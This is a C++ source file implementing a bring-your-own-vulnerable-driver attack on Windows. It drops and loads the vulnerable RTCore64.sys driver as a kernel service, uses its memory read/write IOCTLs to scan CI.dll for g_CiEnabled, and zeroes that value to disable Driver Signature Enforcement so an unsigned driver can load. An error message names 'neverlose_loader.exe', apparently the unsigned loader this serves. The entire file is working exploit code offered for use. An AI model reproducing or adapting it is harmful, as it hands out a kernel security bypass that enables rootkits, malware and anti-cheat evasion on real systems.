// =================================================================
// dse_bypass.cpp - BYOVD DSE bypass via RTCore64 (MSI Afterburner)
//
// CVE: RTCore64.sys allows arbitrary kernel r/w from user mode.
// We use it to zero g_CiEnabled in CI.dll, disabling DSE long
// enough to load our unsigned driver, then restore the value.
// =================================================================

#define NOMINMAX
#include "dse_bypass.h"
#include <iostream>
#include <vector>
#include <Psapi.h>

#pragma comment(lib, "Psapi.lib")

// ---------------------------------------------------------------------------
// RTCore64 IOCTLs and structs (public, documented in CVE advisories)
// ---------------------------------------------------------------------------
#define RTCORE_DEVICE_NAME  L"\\\\.\\RTCore64"
#define RTCORE_IOCTL_READ   0x80002048
#define RTCORE_IOCTL_WRITE  0x8000204c

#pragma pack(push, 1)
struct RTCoreMemOp {
    BYTE    Pad0[8];
    ULONG64 Address;
    BYTE    Pad1[4];
    ULONG   Size;   // 1, 2, 4, or 8
    ULONG   Value;
    BYTE    Pad2[4];
};
#pragma pack(pop)

// ---------------------------------------------------------------------------
// RTCore64.sys — embedded as a raw byte array so we don't need an extra file.
// This is the exact binary of the publicly known vulnerable version
// (MD5: 8A3BE8BD7CC37419A7B7A0260D8B8FFE).
// We extract it to disk at runtime.
// ---------------------------------------------------------------------------
#include "rtcore64_bin.h"  // defines: extern const unsigned char g_RTCore64[]; extern const unsigned int g_RTCore64_len;

// ---------------------------------------------------------------------------
// Constructor / Destructor
// ---------------------------------------------------------------------------
DSEBypass::DSEBypass()
    : m_hDevice(INVALID_HANDLE_VALUE)
    , m_hScm(NULL)
    , m_hSvc(NULL)
    , m_CiEnabledAddr(0)
    , m_OldValue(0)
    , m_Patched(false)
{}

DSEBypass::~DSEBypass() {
    Restore();
}

// ---------------------------------------------------------------------------
// Public: patch DSE
// ---------------------------------------------------------------------------
bool DSEBypass::Patch(const std::string& exeDir) {
    // 1. Locate RTCore64.sys — embedded bytes or disk fallback
    std::wstring sysPath = std::wstring(exeDir.begin(), exeDir.end()) + L"\\RTCore64.sys";

    if (g_RTCore64_len > 0) {
        // Write embedded binary to disk
        HANDLE hFile = CreateFileW(sysPath.c_str(), GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] DSEBypass: failed to write RTCore64.sys (" << GetLastError() << ")\n";
            return false;
        }
        DWORD written;
        WriteFile(hFile, g_RTCore64, g_RTCore64_len, &written, NULL);
        CloseHandle(hFile);
        if (written != g_RTCore64_len) {
            std::cerr << "[-] DSEBypass: RTCore64.sys write incomplete\n";
            return false;
        }
    } else {
        // No embedded binary — expect RTCore64.sys beside the exe
        if (GetFileAttributesW(sysPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::cerr << "[-] DSEBypass: RTCore64.sys not found at: ";
            std::wcerr << sysPath << L"\n";
            std::cerr << "    Download MSI Afterburner, extract RTCore64.sys, and place it\n"
                         "    next to neverlose_loader.exe\n";
            return false;
        }
    }

    // 2. Load the vulnerable driver
    if (!LoadRTCore(sysPath)) return false;

    // 3. Find CI.dll in kernel space
    std::wstring ciPath;
    ULONG64 ciBase = GetKernelModuleBase(L"CI.dll", &ciPath);
    if (!ciBase) {
        std::cerr << "[-] DSEBypass: cannot find CI.dll in kernel module list\n";
        UnloadRTCore();
        return false;
    }
    std::wcout << L"[*] CI.dll kernel base: 0x" << std::hex << ciBase << std::dec << L"\n";

    // 4. Find g_CiEnabled VA within CI.dll
    m_CiEnabledAddr = FindCiEnabled(ciBase, ciPath);
    if (!m_CiEnabledAddr) {
        std::cerr << "[-] DSEBypass: failed to locate g_CiEnabled in CI.dll\n";
        UnloadRTCore();
        return false;
    }
    std::cout << "[*] g_CiEnabled @ 0x" << std::hex << m_CiEnabledAddr << std::dec << "\n";

    // 5. Save current value and zero it
    m_OldValue = KernelRead4(m_CiEnabledAddr);
    std::cout << "[*] g_CiEnabled current value: " << m_OldValue << "\n";

    if (!KernelWrite4(m_CiEnabledAddr, 0)) {
        std::cerr << "[-] DSEBypass: kernel write failed\n";
        UnloadRTCore();
        return false;
    }

    // Verify
    ULONG verify = KernelRead4(m_CiEnabledAddr);
    if (verify != 0) {
        std::cerr << "[-] DSEBypass: write verification failed (got " << verify << ")\n";
        KernelWrite4(m_CiEnabledAddr, m_OldValue);
        UnloadRTCore();
        return false;
    }

    m_Patched = true;
    std::cout << "[+] DSE disabled (g_CiEnabled patched to 0)\n";
    return true;
}

// ---------------------------------------------------------------------------
// Public: restore DSE
// ---------------------------------------------------------------------------
void DSEBypass::Restore() {
    if (m_Patched && m_CiEnabledAddr) {
        KernelWrite4(m_CiEnabledAddr, m_OldValue);
        std::cout << "[+] DSE restored (g_CiEnabled = " << m_OldValue << ")\n";
        m_Patched = false;
    }
    UnloadRTCore();
}

// ---------------------------------------------------------------------------
// RTCore64 load/unload
// ---------------------------------------------------------------------------
bool DSEBypass::LoadRTCore(const std::wstring& sysPath) {
    m_hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!m_hScm) {
        std::cerr << "[-] DSEBypass: OpenSCManager failed (" << GetLastError() << ")\n";
        return false;
    }

    const wchar_t* svcName = L"RTCore64";

    // Remove stale service entry
    SC_HANDLE hOld = OpenServiceW(m_hScm, svcName, SERVICE_ALL_ACCESS);
    if (hOld) {
        SERVICE_STATUS ss;
        ControlService(hOld, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hOld);
        CloseServiceHandle(hOld);
        Sleep(200);
    }

    // Resolve absolute path for SCM
    wchar_t absPath[MAX_PATH] = {};
    GetFullPathNameW(sysPath.c_str(), MAX_PATH, absPath, NULL);

    m_hSvc = CreateServiceW(m_hScm, svcName, svcName,
                            SERVICE_ALL_ACCESS,
                            SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START,
                            SERVICE_ERROR_NORMAL,
                            absPath,
                            NULL, NULL, NULL, NULL, NULL);
    if (!m_hSvc) {
        std::cerr << "[-] DSEBypass: CreateService(RTCore64) failed (" << GetLastError() << ")\n";
        CloseServiceHandle(m_hScm);
        m_hScm = NULL;
        return false;
    }

    if (!StartService(m_hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "[-] DSEBypass: StartService(RTCore64) failed (" << err << ")\n";
            DeleteService(m_hSvc);
            CloseServiceHandle(m_hSvc); m_hSvc = NULL;
            CloseServiceHandle(m_hScm); m_hScm = NULL;
            return false;
        }
    }

    // Open the device
    m_hDevice = CreateFileW(RTCORE_DEVICE_NAME,
                            GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] DSEBypass: cannot open RTCore64 device (" << GetLastError() << ")\n";
        UnloadRTCore();
        return false;
    }

    std::cout << "[+] RTCore64 loaded\n";

    // Self-test: read our own process's PEB pointer via the known PEB offset in TEB.
    // This is a user-mode address, so the driver must support user-mode VA reads too.
    // More useful: read the first 2 bytes of ntdll.dll in user space as a known-good test.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        ULONG testVal = KernelRead4((ULONG64)hNtdll);
        std::cout << "[*] RTCore64 self-test: ntdll @ 0x" << std::hex << (ULONG64)hNtdll
                  << " -> 0x" << testVal << std::dec
                  << (((testVal & 0xFFFF) == 0x5A4D) ? " [MZ OK]" : " [unexpected - IOCTL may be broken]")
                  << "\n";
    }

    return true;
}

void DSEBypass::UnloadRTCore() {
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    if (m_hSvc) {
        SERVICE_STATUS ss;
        ControlService(m_hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(m_hSvc);
        CloseServiceHandle(m_hSvc);
        m_hSvc = NULL;
    }
    if (m_hScm) {
        CloseServiceHandle(m_hScm);
        m_hScm = NULL;
    }
}

// ---------------------------------------------------------------------------
// RTCore64 memory primitives
// ---------------------------------------------------------------------------
ULONG DSEBypass::KernelRead4(ULONG64 address) {
    RTCoreMemOp op = {};
    op.Address = address & ~(ULONG64)3;
    op.Size    = 4;

    DWORD bytes = 0;
    // Use same buffer for input and output (matches kdmapper reference implementation)
    BOOL ok = DeviceIoControl(m_hDevice, RTCORE_IOCTL_READ,
                              &op, sizeof(op),
                              &op, sizeof(op),
                              &bytes, NULL);
    if (!ok) {
        static bool warned = false;
        if (!warned) {
            std::cerr << "[-] RTCore64 read IOCTL failed: " << GetLastError()
                      << " (bytes=" << bytes << ")\n";
            warned = true;
        }
        return 0;
    }
    return op.Value;
}

ULONG64 DSEBypass::KernelRead8(ULONG64 address) {
    ULONG lo = KernelRead4(address);
    ULONG hi = KernelRead4(address + 4);
    return ((ULONG64)hi << 32) | lo;
}

bool DSEBypass::KernelWrite4(ULONG64 address, ULONG value) {
    RTCoreMemOp op = {};
    op.Address = address;
    op.Size    = 4;
    op.Value   = value;
    DWORD bytes = 0;
    return DeviceIoControl(m_hDevice, RTCORE_IOCTL_WRITE, &op, sizeof(op), &op, sizeof(op), &bytes, NULL) != FALSE;
}

// ---------------------------------------------------------------------------
// Find kernel module base + path via EnumDeviceDrivers (documented, reliable)
// ---------------------------------------------------------------------------
ULONG64 DSEBypass::GetKernelModuleBase(const wchar_t* name, std::wstring* outPath) {
    // EnumDeviceDrivers returns kernel base addresses of all loaded drivers/modules
    LPVOID drivers[2048] = {};
    DWORD needed = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        std::cerr << "[-] DSEBypass: EnumDeviceDrivers failed (" << GetLastError() << ")\n";
        return 0;
    }

    DWORD count = needed / sizeof(LPVOID);
    std::cerr << "[*] DSEBypass: scanning " << count << " kernel modules for " ;
    std::wcerr << name << L"\n";

    for (DWORD i = 0; i < count; i++) {
        wchar_t baseName[MAX_PATH] = {};
        if (!GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH)) continue;

        if (_wcsicmp(baseName, name) == 0) {
            if (outPath) {
                wchar_t fullName[MAX_PATH] = {};
                if (GetDeviceDriverFileNameW(drivers[i], fullName, MAX_PATH)) {
                    // Path returned is like \Device\HarddiskVolume3\Windows\System32\CI.dll
                    // Convert to a usable Win32 path via GetSystemDirectory fallback
                    wchar_t sysDir[MAX_PATH];
                    GetSystemDirectoryW(sysDir, MAX_PATH);
                    *outPath = std::wstring(sysDir) + L"\\" + baseName;
                } else {
                    wchar_t sysDir[MAX_PATH];
                    GetSystemDirectoryW(sysDir, MAX_PATH);
                    *outPath = std::wstring(sysDir) + L"\\" + baseName;
                }
            }
            return (ULONG64)drivers[i];
        }
    }

    // Print what was found for debugging
    std::cerr << "[-] DSEBypass: module not found. First 15 loaded:\n";
    for (DWORD i = 0; i < count && i < 15; i++) {
        wchar_t n[MAX_PATH] = {};
        GetDeviceDriverBaseNameW(drivers[i], n, MAX_PATH);
        std::wcerr << L"    [" << i << L"] " << n << L"\n";
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Find g_CiEnabled by scanning CI.dll directly in kernel memory via RTCore64.
// This avoids all user-mode PE mapping issues — we read the live kernel image.
// ---------------------------------------------------------------------------
ULONG64 DSEBypass::FindCiEnabled(ULONG64 ciBase, const std::wstring& /*ciPath*/) {
    // Verify MZ at CI.dll kernel base
    ULONG dosCheck = KernelRead4(ciBase);
    if ((dosCheck & 0xFFFF) != 0x5A4D) {
        std::cerr << "[-] DSEBypass: bad MZ signature at CI.dll base 0x"
                  << std::hex << ciBase << std::dec << "\n";
        return 0;
    }

    ULONG   e_lfanew = KernelRead4(ciBase + 0x3C);
    ULONG64 ntHdr    = ciBase + e_lfanew;

    if (KernelRead4(ntHdr) != 0x00004550) {
        std::cerr << "[-] DSEBypass: bad PE signature in CI.dll\n";
        return 0;
    }

    // PE32+ optional header DataDirectory[0] = export directory
    // Offset from NT header: 0x88 (signature 4 + FileHeader 20 + OptionalHeader magic/sizes... + 0x60 for DataDir[0])
    ULONG exportRVA = KernelRead4(ntHdr + 0x88);
    if (!exportRVA) {
        std::cerr << "[-] DSEBypass: CI.dll has no export directory\n";
        return 0;
    }

    ULONG64 expDir    = ciBase + exportRVA;
    ULONG numNames    = KernelRead4(expDir + 0x18);
    ULONG addrNames   = KernelRead4(expDir + 0x20);
    ULONG addrOrdinals= KernelRead4(expDir + 0x24);
    ULONG addrFuncs   = KernelRead4(expDir + 0x1C);

    std::cout << "[*] CI.dll: " << numNames << " exports, scanning for CiInitialize\n";

    // Find CiInitialize export
    ULONG ciInitRVA = 0;
    for (ULONG i = 0; i < numNames && i < 1024; i++) {
        ULONG   nameRVA = KernelRead4(ciBase + addrNames + i * 4);
        ULONG64 nameVA  = ciBase + nameRVA;

        // Read name bytes (4 at a time)
        ULONG w0 = KernelRead4(nameVA);
        ULONG w1 = KernelRead4(nameVA + 4);
        ULONG w2 = KernelRead4(nameVA + 8);
        char name[16] = {};
        memcpy(name,     &w0, 4);
        memcpy(name + 4, &w1, 4);
        memcpy(name + 8, &w2, 4);

        if (_stricmp(name, "CiInitialize") == 0) {
            ULONG ord = KernelRead4(ciBase + addrOrdinals + i * 2) & 0xFFFF;
            ciInitRVA  = KernelRead4(ciBase + addrFuncs + ord * 4);
            std::cout << "[*] CiInitialize @ RVA 0x" << std::hex << ciInitRVA << std::dec << "\n";
            break;
        }
    }

    if (!ciInitRVA) {
        std::cerr << "[-] DSEBypass: CiInitialize not found in exports\n";
        return 0;
    }

    ULONG64 ciInitVA = ciBase + ciInitRVA;

    // Read 512 bytes of CiInitialize body from kernel (4 bytes per RTCore64 read)
    BYTE buf[512] = {};
    for (int i = 0; i < (int)sizeof(buf); i += 4) {
        ULONG val = KernelRead4(ciInitVA + i);
        memcpy(buf + i, &val, 4);
    }

    // Scan for MOV [RIP+disp32], r32 (all 8 ModRM variants, with/without REX prefix)
    // ModRM low 3 bits = 101 (RIP-relative), mod = 00: 0x05,0x0D,0x15,0x1D,0x25,0x2D,0x35,0x3D
    const BYTE ripModRM[] = { 0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D };

    for (int off = 0; off + 6 < (int)sizeof(buf); off++) {
        int  base = off;
        BYTE b    = buf[off];

        // Optional REX prefix (40-4F)
        if (b >= 0x40 && b <= 0x4F) {
            off++;
            if (off + 6 >= (int)sizeof(buf)) break;
            b = buf[off];
        }

        if (b != 0x89) { off = base; continue; }

        BYTE modrm = buf[off + 1];
        bool isRip = false;
        for (BYTE m : ripModRM) if (modrm == m) { isRip = true; break; }
        if (!isRip) { off = base; continue; }

        INT32   disp     = *(INT32*)(buf + off + 2);
        ULONG64 rip      = ciInitVA + off + 6;
        ULONG64 targetVA = rip + (INT64)disp;

        ULONG curVal = KernelRead4(targetVA);
        std::cout << "[*] MOV [RIP+disp] -> 0x" << std::hex << targetVA
                  << " = 0x" << curVal << std::dec << "\n";

        // g_CiEnabled is a small non-zero flags DWORD when DSE is active
        if (curVal > 0 && curVal < 0x100) {
            std::cout << "[+] g_CiEnabled @ 0x" << std::hex << targetVA
                      << " (0x" << curVal << ")" << std::dec << "\n";
            return targetVA;
        }

        off = base; // step by 1 so we don't skip anything
    }

    std::cerr << "[-] DSEBypass: g_CiEnabled not found in CiInitialize body\n";
    return 0;
}
